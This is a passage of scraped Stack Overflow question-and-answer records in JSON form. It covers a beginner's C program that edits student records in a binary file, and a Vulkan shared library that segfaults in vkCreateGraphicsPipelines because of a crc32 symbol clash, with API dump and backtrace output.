"user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 2, "creation_date": 1551902965, "post_id": 55031059, "comment_id": 96815386, "body": "&quot;it doesn&#39;t take the new mark value.&quot; -- What does that mean? The new mark does not show up when you print it with as <code>&quot;Nouveau Moyen = %.2f&quot;</code>? That&#39;s the only location where you use it, because you don&#39;t update <code>E</code> in <code>main</code> -- the one in <code>ModifierEtudiant</code> is a copy. And you don&#39;t update the file, either."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1551903028, "post_id": 55031059, "comment_id": 96815424, "body": "In function <code>ModifierEtudiant</code> there is no <code>fseek</code> and <code>fwrite</code> to put the modified <code>struct</code> back into the file."}, {"owner": {"reputation": 37, "user_id": 11091643, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s7F5o_n7qn4/AAAAAAAAAAI/AAAAAAAAArQ/gDpkNU9MCwg/photo.jpg?sz=128", "display_name": "Ayoub Souid", "link": "https://stackoverflow.com/users/11091643/ayoub-souid"}, "edited": false, "score": 0, "creation_date": 1551903548, "post_id": 55031059, "comment_id": 96815646, "body": "Weather Vane yeah you are right but i&#39;ve thought about the fseek but it takes 3 argument how can i point it in position of the record in the file ?"}, {"owner": {"reputation": 37, "user_id": 11091643, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s7F5o_n7qn4/AAAAAAAAAAI/AAAAAAAAArQ/gDpkNU9MCwg/photo.jpg?sz=128", "display_name": "Ayoub Souid", "link": "https://stackoverflow.com/users/11091643/ayoub-souid"}, "edited": false, "score": 0, "creation_date": 1551904729, "post_id": 55031059, "comment_id": 96816155, "body": "guys check the image i&#39;ve added now"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551983537, "post_id": 55031059, "comment_id": 96851117, "body": "Please do not post images.  Rather copy/paste the text into the question"}], "answers": [{"tags": [], "owner": {"reputation": 37, "user_id": 11091643, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s7F5o_n7qn4/AAAAAAAAAAI/AAAAAAAAArQ/gDpkNU9MCwg/photo.jpg?sz=128", "display_name": "Ayoub Souid", "link": "https://stackoverflow.com/users/11091643/ayoub-souid"}, "is_accepted": false, "score": 0, "last_activity_date": 1551908132, "creation_date": 1551908132, "answer_id": 55032530, "question_id": 55031059, "link": "https://stackoverflow.com/questions/55031059/modifying-a-record-in-binary-file/55032530#55032530", "title": "Modifying a record in binary file", "body": "<p>Had to control the pointer ! \nfseek(fichierEtudiant,-(long)sizeof(E),1);\nfwrite (&amp;E, sizeof(E), 1,fichierEtudiant);</p>\n"}], "owner": {"reputation": 37, "user_id": 11091643, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s7F5o_n7qn4/AAAAAAAAAAI/AAAAAAAAArQ/gDpkNU9MCwg/photo.jpg?sz=128", "display_name": "Ayoub Souid", "link": "https://stackoverflow.com/users/11091643/ayoub-souid"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 60, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1551916533, "creation_date": 1551901482, "last_edit_date": 1551916533, "question_id": 55031059, "link": "https://stackoverflow.com/questions/55031059/modifying-a-record-in-binary-file", "title": "Modifying a record in binary file", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n#define etudian_num 400\nstruct etudiant{\n    char nom[10];\n    float moy;\n};\n\nvoid SaisirEtudiant(struct etudiant E,FILE *ficheierEtudiant) {\n    ficheierEtudiant = fopen(\"C:/Users/Ayoub/Desktop/TDTP/Ex1/Etudiant.dat\",\"wb\");\n    char rep;\n    do {\n        fseek(ficheierEtudiant, 0, SEEK_END);\n\n        printf(\"Saisir nom etudiant a saisir: \");\n        scanf(\"%s\",&amp;E.nom);\n        printf(\"Saisir son Moyen: \");\n        scanf(\"%f\",&amp;E.moy);\n        fwrite (&amp;E, sizeof(struct etudiant), 1,ficheierEtudiant);\n        if(fwrite!=0) {\n            printf(\"\\n\\nEtudaint Ajouter avec succees !\\n\\n\");\n        }\n        printf(\"Voulez Vouz Saisir un autre Etudiant (O,N): \");\n        scanf(\" %c\",&amp;rep);\n    } while(toupper(rep)!='N');\n    fclose(ficheierEtudiant);    \n}\n\nvoid AjoutEtudian(struct etudiant E,FILE *ficheierEtudiant) {    \n    ficheierEtudiant=fopen(\"C:/Users/Ayoub/Desktop/TDTP/Ex1/Etudiant.dat\",\"ab+\");\n    printf(\"Saisir Nom de Nouveau Etudiant: \");\n    scanf(\"%s\",&amp;E.nom);\n    printf(\"Saisir Son Moyen: \");\n    scanf(\"%f\",&amp;E.moy);\n    fwrite (&amp;E, sizeof(struct etudiant), 1,ficheierEtudiant);\n    printf(\"Saisir de nouveau Etudiant avec Success ! \");\n    fclose(ficheierEtudiant);\n}\n\nvoid EcrireListeEtudiant(struct etudiant E, FILE* fichierEtudiant) {\n    fichierEtudiant=fopen(\"C:/Users/Ayoub/Desktop/TDTP/Ex1/Etudiant.dat\",\"r+\");\n    while(fread(&amp;E,sizeof(struct etudiant),1,fichierEtudiant)){\n    printf(\"Nom Etudiant: %s| Moyen= %.2f \\n\", E.nom, E.moy);}\n    fclose(fichierEtudiant);\n}\n\nvoid ModifierEtudiant(struct etudiant E,FILE* fichierEtudiant) {\n    fichierEtudiant=fopen(\"C:/Users/Ayoub/Desktop/TDTP/Ex1/Etudiant.dat\",\"rb+\");\n    char RechercheEtudiant[10];\n    float NouveauMoyen;\n    printf(\"Saisir Le nom de letudiant a modifier son Moyen: \");\n    scanf(\"%s\",&amp;RechercheEtudiant);\n    float Moyenancianen=0.0;\n    while(fread(&amp;E,sizeof(struct etudiant),1,fichierEtudiant)) {\n        if(strcmp(E.nom,RechercheEtudiant)==0) {\n            Moyenancianen=E.moy;\n            printf(\"Saisir Nouveau Moyen pour \",E.nom);\n            scanf(\"%f\",&amp;NouveauMoyen);\n            E.moy=NouveauMoyen;\n            printf(\"\\n\\nMoyen Ancien = %.2f , Nouveau Moyen = %.2f\\n\\n\",Moyenancianen,NouveauMoyen);\n        }else {\n            printf(\"Nom invalid !\");\n        }    \n    }\n    fclose(fichierEtudiant);    \n}\n\nvoid Menu() {\n    printf(\"Press: \\n\");\n    printf(\"\\t\\n1-Pour Ajouter un Nouveau List des Etudiant\\n\");\n    printf(\"\\t\\n2-pour imprimer Liste des Etudiant \\n\");\n    printf(\"\\t\\n3-pour Ajouter un Nouveau Etudiant \\n\");\n    printf(\"\\t\\n4-pour Modifier Moyen d un Etudain\\n\");\n    printf(\"\\t\\n5-pour imprimer Liste de Menu\\n\");\n    printf(\"\\t\\n6-Pour Quitter \\n\");\n} \n\nint main()\n{ printf(\"\\t\\t***************************Programme de Gestion des Etudiants***************************\\n\\n\\n\\n\");\n   FILE *fichierEtudiant;\n    struct etudiant E;\n    int choice;\n    int num;\n    int quit=0;\n    Menu();\n    while(quit==0){\n        printf(\"\\nSaisir Votre Choix: \");\n        scanf(\"%d\",&amp;choice);\n        switch(choice){\n        case 1:\n            SaisirEtudiant(E,fichierEtudiant);\n            break;\n        case 2:\n            EcrireListeEtudiant(E,fichierEtudiant);\n            break;\n        case 3:\n            AjoutEtudian(E,fichierEtudiant);\n            break;\n\n        case 4:\n            ModifierEtudiant(E,fichierEtudiant);\n            break;\n        case 5:\n            Menu();\n            break;\n        case 6:\n            quit =1;\n            printf(\"A bientot.....\");\n            break;\n        }\n    }   \n}\n</code></pre>\n\n<p>The program is about to store a List of students and their marks. Everything works well until the modify part (ModifierEtudiant method). I'm reading the name from the user so I can later check if it does exist in the binary file. If it is found, I demand the user to input a new mark and it seems that it doesn't take the new mark value.</p>\n\n<p><img src=\"https://i.stack.imgur.com/E18B5.png\" alt=\"\"></p>\n"}, {"tags": ["c", "vulkan"], "comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 3, "creation_date": 1551902955, "post_id": 55030997, "comment_id": 96815379, "body": "Do not describe code, show it. Both versions, the problem-free non-lib version and the problematic lib version. Also explain in detail how you build. Preferrably provide the commandline/makefile."}, {"owner": {"reputation": 8395, "user_id": 3007154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb7293bd97c47febd218463c27b394c6?s=128&d=identicon&r=PG&f=1", "display_name": "krOoze", "link": "https://stackoverflow.com/users/3007154/krooze"}, "edited": false, "score": 0, "creation_date": 1551908077, "post_id": 55030997, "comment_id": 96817563, "body": "Shared library is code as any other. Only differs in linking. How do you load shaders?"}, {"owner": {"reputation": 63, "user_id": 11032548, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-B7snL_5M1Ak/AAAAAAAAAAI/AAAAAAAAAAA/ACevoQMFlgykmFJtGIHfs5hBxrPVmlbLcw/mo/photo.jpg?sz=128", "display_name": "Ojad Yref", "link": "https://stackoverflow.com/users/11032548/ojad-yref"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1551908505, "post_id": 55030997, "comment_id": 96817750, "body": "Thank you for your criticism @Yunnosch. I hope it&#39;s better now."}, {"owner": {"reputation": 63, "user_id": 11032548, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-B7snL_5M1Ak/AAAAAAAAAAI/AAAAAAAAAAA/ACevoQMFlgykmFJtGIHfs5hBxrPVmlbLcw/mo/photo.jpg?sz=128", "display_name": "Ojad Yref", "link": "https://stackoverflow.com/users/11032548/ojad-yref"}, "reply_to_user": {"reputation": 8395, "user_id": 3007154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb7293bd97c47febd218463c27b394c6?s=128&d=identicon&r=PG&f=1", "display_name": "krOoze", "link": "https://stackoverflow.com/users/3007154/krooze"}, "edited": false, "score": 0, "creation_date": 1551908609, "post_id": 55030997, "comment_id": 96817794, "body": "@krOoze I load the shaders exactly like the cube.c example from the vulkan-sdk. Thank you for answering me!"}, {"owner": {"reputation": 8286, "user_id": 533037, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/f711473fb27cd269ba5ad2064c15dcd3?s=128&d=identicon&r=PG", "display_name": "solidpixel", "link": "https://stackoverflow.com/users/533037/solidpixel"}, "edited": false, "score": 1, "creation_date": 1551949090, "post_id": 55030997, "comment_id": 96830371, "body": "Where does <code>pipelineLayoutInfo</code> come from?"}, {"owner": {"reputation": 63, "user_id": 11032548, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-B7snL_5M1Ak/AAAAAAAAAAI/AAAAAAAAAAA/ACevoQMFlgykmFJtGIHfs5hBxrPVmlbLcw/mo/photo.jpg?sz=128", "display_name": "Ojad Yref", "link": "https://stackoverflow.com/users/11032548/ojad-yref"}, "reply_to_user": {"reputation": 8286, "user_id": 533037, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/f711473fb27cd269ba5ad2064c15dcd3?s=128&d=identicon&r=PG", "display_name": "solidpixel", "link": "https://stackoverflow.com/users/533037/solidpixel"}, "edited": false, "score": 0, "creation_date": 1551950110, "post_id": 55030997, "comment_id": 96831013, "body": "@solidpixel I&#39;ve updated the source code. It&#39;s a very simple setup and I omitted a lot to keep it as short as possible."}, {"owner": {"reputation": 63, "user_id": 11032548, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-B7snL_5M1Ak/AAAAAAAAAAI/AAAAAAAAAAA/ACevoQMFlgykmFJtGIHfs5hBxrPVmlbLcw/mo/photo.jpg?sz=128", "display_name": "Ojad Yref", "link": "https://stackoverflow.com/users/11032548/ojad-yref"}, "reply_to_user": {"reputation": 8395, "user_id": 3007154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb7293bd97c47febd218463c27b394c6?s=128&d=identicon&r=PG&f=1", "display_name": "krOoze", "link": "https://stackoverflow.com/users/3007154/krooze"}, "edited": false, "score": 0, "creation_date": 1551954789, "post_id": 55030997, "comment_id": 96834045, "body": "@krOoze maybe the backtrace (please see the updated question) sheds some light on the issue."}, {"owner": {"reputation": 8395, "user_id": 3007154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb7293bd97c47febd218463c27b394c6?s=128&d=identicon&r=PG&f=1", "display_name": "krOoze", "link": "https://stackoverflow.com/users/3007154/krooze"}, "edited": false, "score": 1, "creation_date": 1551958439, "post_id": 55030997, "comment_id": 96836350, "body": "The backtrace looks weird to me. There&#39;s not even the Vulkan Loader present in it. Not to mention the validation layers..."}, {"owner": {"reputation": 8395, "user_id": 3007154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb7293bd97c47febd218463c27b394c6?s=128&d=identicon&r=PG&f=1", "display_name": "krOoze", "link": "https://stackoverflow.com/users/3007154/krooze"}, "edited": false, "score": 1, "creation_date": 1551958830, "post_id": 55030997, "comment_id": 96836575, "body": "BTW, you are not checking if the <code>malloc</code>s succeeded. GLFW errco is also not checked. Some commands are not checked for <code>VkResult</code>."}, {"owner": {"reputation": 8395, "user_id": 3007154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb7293bd97c47febd218463c27b394c6?s=128&d=identicon&r=PG&f=1", "display_name": "krOoze", "link": "https://stackoverflow.com/users/3007154/krooze"}, "edited": false, "score": 0, "creation_date": 1551959098, "post_id": 55030997, "comment_id": 96836729, "body": "Maybe try the <code>VK_LAYER_LUNARG_api_dump</code> layer so we see what actually goes in and out."}, {"owner": {"reputation": 8395, "user_id": 3007154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb7293bd97c47febd218463c27b394c6?s=128&d=identicon&r=PG&f=1", "display_name": "krOoze", "link": "https://stackoverflow.com/users/3007154/krooze"}, "edited": false, "score": 1, "creation_date": 1551959665, "post_id": 55030997, "comment_id": 96837049, "body": "Variables used in <code>pipelineInfo</code> do not even exist. Is this some kind of pseudocode?"}, {"owner": {"reputation": 63, "user_id": 11032548, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-B7snL_5M1Ak/AAAAAAAAAAI/AAAAAAAAAAA/ACevoQMFlgykmFJtGIHfs5hBxrPVmlbLcw/mo/photo.jpg?sz=128", "display_name": "Ojad Yref", "link": "https://stackoverflow.com/users/11032548/ojad-yref"}, "reply_to_user": {"reputation": 8395, "user_id": 3007154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb7293bd97c47febd218463c27b394c6?s=128&d=identicon&r=PG&f=1", "display_name": "krOoze", "link": "https://stackoverflow.com/users/3007154/krooze"}, "edited": false, "score": 0, "creation_date": 1551961833, "post_id": 55030997, "comment_id": 96838380, "body": "@krOoze yes it is, (notice the // ...structs abstracted). I thought that it doesn&#39;t matter because the code seems to be fine when compiling as a static lib. I will update the question once I tried all your suggestions. I will also post the code without any abstractions (it probably was a bad idea anyway - verbose is king when it comes to debugging - sorry about that). Thank you so much!"}, {"owner": {"reputation": 63, "user_id": 11032548, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-B7snL_5M1Ak/AAAAAAAAAAI/AAAAAAAAAAA/ACevoQMFlgykmFJtGIHfs5hBxrPVmlbLcw/mo/photo.jpg?sz=128", "display_name": "Ojad Yref", "link": "https://stackoverflow.com/users/11032548/ojad-yref"}, "reply_to_user": {"reputation": 8395, "user_id": 3007154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb7293bd97c47febd218463c27b394c6?s=128&d=identicon&r=PG&f=1", "display_name": "krOoze", "link": "https://stackoverflow.com/users/3007154/krooze"}, "edited": false, "score": 0, "creation_date": 1551968747, "post_id": 55030997, "comment_id": 96842578, "body": "@krOoze I posted the complete code (without renderpass structs due to char limitation) and activated the api dump layer. I also updated the gdb backtrace. Unfortunately still no luck."}], "answers": [{"tags": [], "owner": {"reputation": 63, "user_id": 11032548, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-B7snL_5M1Ak/AAAAAAAAAAI/AAAAAAAAAAA/ACevoQMFlgykmFJtGIHfs5hBxrPVmlbLcw/mo/photo.jpg?sz=128", "display_name": "Ojad Yref", "link": "https://stackoverflow.com/users/11032548/ojad-yref"}, "is_accepted": true, "score": 1, "last_activity_date": 1552063312, "creation_date": 1552063312, "answer_id": 55067423, "question_id": 55030997, "link": "https://stackoverflow.com/questions/55030997/vkcreategraphicspipelines-segfaults-in-shared-library-but-not-in-static-library/55067423#55067423", "title": "vkCreateGraphicsPipelines segfault&#39;s in shared library but not in static library", "body": "<p>The segfault in</p>\n\n<pre><code>#0  0x00007ffff7fc37db in crc32 () from /usr/local/lib/libvui.so.0\n</code></pre>\n\n<p>was caused by a declaration conflict. Basically, I included a lib which contained a function called crc32. There must be a function with the same declaration somewhere in libvulkan_intel.so or at least somewhere as an outside dependency. Either way, when compiling as a shared library I was effectively overriding crc32 which resulted in a segfault as soon as crc32 was called.. not my proudest bug but it happens.</p>\n"}], "owner": {"reputation": 63, "user_id": 11032548, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-B7snL_5M1Ak/AAAAAAAAAAI/AAAAAAAAAAA/ACevoQMFlgykmFJtGIHfs5hBxrPVmlbLcw/mo/photo.jpg?sz=128", "display_name": "Ojad Yref", "link": "https://stackoverflow.com/users/11032548/ojad-yref"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 290, "favorite_count": 0, "accepted_answer_id": 55067423, "answer_count": 1, "score": 3, "last_activity_date": 1552063734, "creation_date": 1551901246, "last_edit_date": 1552063734, "question_id": 55030997, "link": "https://stackoverflow.com/questions/55030997/vkcreategraphicspipelines-segfaults-in-shared-library-but-not-in-static-library", "title": "vkCreateGraphicsPipelines segfault&#39;s in shared library but not in static library", "body": "<p>I'm trying to write a shared library (in c) which is supposed to initiate vulkan (among other things). By initiating I mean it should do the whole setup-chain ranging from instance creation to pipeline creation. </p>\n\n<p>When I call the aforementioned function as a static library function -> everything works and there is no  segfault occurring in vkCreateGraphicsPipelines. However, when I build the same function as a shared (.so) library and call it -> vkCreateGraphicsPipelines segfault's.</p>\n\n<h1>Update 07.03.19</h1>\n\n<p>Validation Layers are now running on full steam.</p>\n\n<h3>Compilation with static lib:</h3>\n\n<pre><code>gcc test.c -lvulkan -lglfw -lvui_static\n</code></pre>\n\n<p>Callback output regarding pipeline creation (function exits normally):</p>\n\n<pre><code>creating pipeline!\nThread 0, Frame 0:\nvkCreateGraphicsPipelines(device, pipelineCache, createInfoCount, pCreateInfos, pAllocator, pPipelines) returns VkResult VK_SUCCESS (0):\n    device:                         VkDevice = 0x559b52daf3a0\n    pipelineCache:                  VkPipelineCache = 0\n    createInfoCount:                uint32_t = 1\n    pCreateInfos:                   const VkGraphicsPipelineCreateInfo* = 0x559b52cd57f8\n        pCreateInfos[0]:                const VkGraphicsPipelineCreateInfo = 0x559b52cd57f8:\n            sType:                          VkStructureType = VK_STRUCTURE_TYPE_GRAPHICS_PIPELINE_CREATE_INFO (28)\n            pNext:                          const void* = NULL\n            flags:                          VkPipelineCreateFlags = 0\n            stageCount:                     uint32_t = 2\n            pStages:                        const VkPipelineShaderStageCreateInfo* = 0x559b52cd8058\n                pStages[0]:                     const VkPipelineShaderStageCreateInfo = 0x559b52cd8058:\n                    sType:                          VkStructureType = VK_STRUCTURE_TYPE_PIPELINE_SHADER_STAGE_CREATE_INFO (18)\n                    pNext:                          const void* = NULL\n                    flags:                          VkPipelineShaderStageCreateFlags = 0\n                    stage:                          VkShaderStageFlagBits = 1 (VK_SHADER_STAGE_VERTEX_BIT | VK_SHADER_STAGE_ALL_GRAPHICS | VK_SHADER_STAGE_ALL)\n                    module:                         VkShaderModule = 0x559b52cd8910\n                    pName:                          const char* = \"main\"\n                    pSpecializationInfo:            const VkSpecializationInfo* = NULL\n                pStages[1]:                     const VkPipelineShaderStageCreateInfo = 0x559b52cd8088:\n                    sType:                          VkStructureType = VK_STRUCTURE_TYPE_PIPELINE_SHADER_STAGE_CREATE_INFO (18)\n                    pNext:                          const void* = NULL\n                    flags:                          VkPipelineShaderStageCreateFlags = 0\n                    stage:                          VkShaderStageFlagBits = 16 (VK_SHADER_STAGE_FRAGMENT_BIT | VK_SHADER_STAGE_ALL_GRAPHICS | VK_SHADER_STAGE_ALL)\n                    module:                         VkShaderModule = 0x559b52dcc6b0\n                    pName:                          const char* = \"main\"\n                    pSpecializationInfo:            const VkSpecializationInfo* = NULL\n            pVertexInputState:              const VkPipelineVertexInputStateCreateInfo* = 0x559b52dcf790:\n                sType:                          VkStructureType = VK_STRUCTURE_TYPE_PIPELINE_VERTEX_INPUT_STATE_CREATE_INFO (19)\n                pNext:                          const void* = NULL\n                flags:                          VkPipelineVertexInputStateCreateFlags = 0\n                vertexBindingDescriptionCount:  uint32_t = 0\n                pVertexBindingDescriptions:     const VkVertexInputBindingDescription* = NULL\n                vertexAttributeDescriptionCount: uint32_t = 0\n                pVertexAttributeDescriptions:   const VkVertexInputAttributeDescription* = NULL\n            pInputAssemblyState:            const VkPipelineInputAssemblyStateCreateInfo* = 0x559b52dcf030:\n                sType:                          VkStructureType = VK_STRUCTURE_TYPE_PIPELINE_INPUT_ASSEMBLY_STATE_CREATE_INFO (20)\n                pNext:                          const void* = NULL\n                flags:                          VkPipelineInputAssemblyStateCreateFlags = 0\n                topology:                       VkPrimitiveTopology = VK_PRIMITIVE_TOPOLOGY_TRIANGLE_LIST (3)\n                primitiveRestartEnable:         VkBool32 = 0\n            pTessellationState:             const VkPipelineTessellationStateCreateInfo* = NULL\n            pViewportState:                 const VkPipelineViewportStateCreateInfo* = 0x559b52dcf140:\n                sType:                          VkStructureType = VK_STRUCTURE_TYPE_PIPELINE_VIEWPORT_STATE_CREATE_INFO (22)\n                pNext:                          const void* = NULL\n                flags:                          VkPipelineViewportStateCreateFlags = 0\n                viewportCount:                  uint32_t = 1\n                pViewports:                     const VkViewport* = 0x559b52dc8e70\n                    pViewports[0]:                  const VkViewport = 0x559b52dc8e70:\n                        x:                              float = 0\n                        y:                              float = 0\n                        width:                          float = 500\n                        height:                         float = 500\n                        minDepth:                       float = 0\n                        maxDepth:                       float = 1\n                scissorCount:                   uint32_t = 1\n                pScissors:                      const VkRect2D* = 0x559b52dc94f0\n                    pScissors[0]:                   const VkRect2D = 0x559b52dc94f0:\n                        offset:                         VkOffset2D = 0x559b52dc94f0:\n                            x:                              int32_t = 0\n                            y:                              int32_t = 0\n                        extent:                         VkExtent2D = 0x559b52dc94f8:\n                            width:                          uint32_t = 500\n                            height:                         uint32_t = 500\n            pRasterizationState:            const VkPipelineRasterizationStateCreateInfo* = 0x559b52dca7a0:\n                sType:                          VkStructureType = VK_STRUCTURE_TYPE_PIPELINE_RASTERIZATION_STATE_CREATE_INFO (23)\n                pNext:                          const void* = NULL\n                flags:                          VkPipelineRasterizationStateCreateFlags = 0\n                depthClampEnable:               VkBool32 = 0\n                rasterizerDiscardEnable:        VkBool32 = 0\n                polygonMode:                    VkPolygonMode = VK_POLYGON_MODE_FILL (0)\n                cullMode:                       VkCullModeFlags = 2 (VK_CULL_MODE_BACK_BIT | VK_CULL_MODE_FRONT_AND_BACK)\n                frontFace:                      VkFrontFace = VK_FRONT_FACE_CLOCKWISE (1)\n                depthBiasEnable:                VkBool32 = 0\n                depthBiasConstantFactor:        float = 0\n                depthBiasClamp:                 float = 0\n                depthBiasSlopeFactor:           float = 0\n                lineWidth:                      float = 1\n            pMultisampleState:              const VkPipelineMultisampleStateCreateInfo* = 0x559b52dc93e0:\n                sType:                          VkStructureType = VK_STRUCTURE_TYPE_PIPELINE_MULTISAMPLE_STATE_CREATE_INFO (24)\n                pNext:                          const void* = NULL\n                flags:                          VkPipelineMultisampleStateCreateFlags = 0\n                rasterizationSamples:           VkSampleCountFlagBits = 1 (VK_SAMPLE_COUNT_1_BIT)\n                sampleShadingEnable:            VkBool32 = 0\n                minSampleShading:               float = 0\n                pSampleMask:                    const VkSampleMask* = NULL\n                alphaToCoverageEnable:          VkBool32 = 0\n                alphaToOneEnable:               VkBool32 = 0\n            pDepthStencilState:             const VkPipelineDepthStencilStateCreateInfo* = NULL\n            pColorBlendState:               const VkPipelineColorBlendStateCreateInfo* = 0x559b52cd6f90:\n                sType:                          VkStructureType = VK_STRUCTURE_TYPE_PIPELINE_COLOR_BLEND_STATE_CREATE_INFO (26)\n                pNext:                          const void* = NULL\n                flags:                          VkPipelineColorBlendStateCreateFlags = 0\n                logicOpEnable:                  VkBool32 = 0\n                logicOp:                        VkLogicOp = VK_LOGIC_OP_COPY (3)\n                attachmentCount:                uint32_t = 1\n                pAttachments:                   const VkPipelineColorBlendAttachmentState* = 0x559b52dcf0a0\n                    pAttachments[0]:                const VkPipelineColorBlendAttachmentState = 0x559b52dcf0a0:\n                        blendEnable:                    VkBool32 = 0\n                        srcColorBlendFactor:            VkBlendFactor = VK_BLEND_FACTOR_ZERO (0)\n                        dstColorBlendFactor:            VkBlendFactor = VK_BLEND_FACTOR_ZERO (0)\n                        colorBlendOp:                   VkBlendOp = VK_BLEND_OP_ADD (0)\n                        srcAlphaBlendFactor:            VkBlendFactor = VK_BLEND_FACTOR_ZERO (0)\n                        dstAlphaBlendFactor:            VkBlendFactor = VK_BLEND_FACTOR_ZERO (0)\n                        alphaBlendOp:                   VkBlendOp = VK_BLEND_OP_ADD (0)\n                        colorWriteMask:                 VkColorComponentFlags = 15 (VK_COLOR_COMPONENT_R_BIT | VK_COLOR_COMPONENT_G_BIT | VK_COLOR_COMPONENT_B_BIT | VK_COLOR_COMPONENT_A_BIT)\n                blendConstants:                 float[4] = 0x559b52cd6fb8\n                    blendConstants[0]:              float = 0\n                    blendConstants[1]:              float = 0\n                    blendConstants[2]:              float = 0\n                    blendConstants[3]:              float = 0\n            pDynamicState:                  const VkPipelineDynamicStateCreateInfo* = NULL\n            layout:                         VkPipelineLayout = 0x559b52cd6de0\n            renderPass:                     VkRenderPass = 0x559b52c582d0\n            subpass:                        uint32_t = 0\n            basePipelineHandle:             VkPipeline = 0\n            basePipelineIndex:              int32_t = 0\n    pAllocator:                     const VkAllocationCallbacks* = NULL\n    pPipelines:                     VkPipeline* = 0x559b528e53e0\n        pPipelines[0]:                  VkPipeline = 0x559b52dcaa60\n\npipeline created!\n</code></pre>\n\n<h3>Compilation with shared lib:</h3>\n\n<pre><code>gcc test.c -lvulkan -lglfw -lvui\n</code></pre>\n\n<p>Callback output regarding pipeline creation (function exits abnormally -> no api dump):</p>\n\n<pre><code>creating pipeline!\nSegmentation fault (core dumped)\n</code></pre>\n\n<p>gdb backtrace: </p>\n\n<pre><code>Thread 1 \"a.out\" received signal SIGSEGV, Segmentation fault.\n0x00007ffff7d1549a in crc32 () from /usr/local/lib/libvui.so.0\n(gdb) bt\n#0  0x00007ffff7d1549a in crc32 () from /usr/local/lib/libvui.so.0\n#1  0x00007ffff5fb252f in ?? () from /usr/lib/libvulkan_intel.so\n#2  0x00007ffff5fac515 in ?? () from /usr/lib/libvulkan_intel.so\n#3  0x00007ffff5e42d13 in ?? () from /usr/lib/libvulkan_intel.so\n#4  0x00007ffff5e403d3 in ?? () from /usr/lib/libvulkan_intel.so\n#5  0x00007ffff5e41bbb in ?? () from /usr/lib/libvulkan_intel.so\n#6  0x00007ffff5e6ce44 in ?? () from /usr/lib/libvulkan_intel.so\n#7  0x00007ffff5454aff in vkCreateGraphicsPipelines ()\n</code></pre>\n\n<h2>vui_vulkanInit.c (calls vkCreateGraphicsPipeline()):</h2>\n\n<pre><code>#include \"../vui_vulkanInit.h\"\n#include \"../vui_debug.h\"\n\n#include &lt;GLFW/glfw3.h&gt;\n#include &lt;vulkan/vulkan.h&gt;\n\n#include &lt;stdint.h&gt;\n#include &lt;limits.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;errno.h&gt;\n\nvoid initVulkan() \n{\n// handles \n    GLFWwindow* window;\n    VkInstance *instance               = malloc(sizeof(VkInstance));\n    VkSurfaceKHR *surface              = malloc(sizeof(VkSurfaceKHR));\n    VkPhysicalDevice *physicalDevice   = malloc(sizeof(VkPhysicalDevice));\n    VkDevice *device                   = malloc(sizeof(VkDevice));\n    VkQueue *graphicsQueue             = malloc(sizeof(VkQueue));\n    VkSwapchainKHR *swapChain          = malloc(sizeof(VkSwapchainKHR));\n    VkImage *swapChainImages           = malloc(sizeof(VkImage) * 3);\n    VkFormat *swapChainImageFormat     = malloc(sizeof(VkFormat));\n    VkExtent2D *swapChainExtent        = malloc(sizeof(VkExtent2D));\n    VkImageView *swapChainImageViews   = malloc(sizeof(VkImageView) * 3);\n    VkRenderPass *renderPass           = malloc(sizeof(VkRenderPass));\n    VkPipelineLayout *pipelineLayout   = malloc(sizeof(VkPipelineLayout));\n    VkPipeline *graphicsPipeline       = malloc(sizeof(VkPipeline));\n    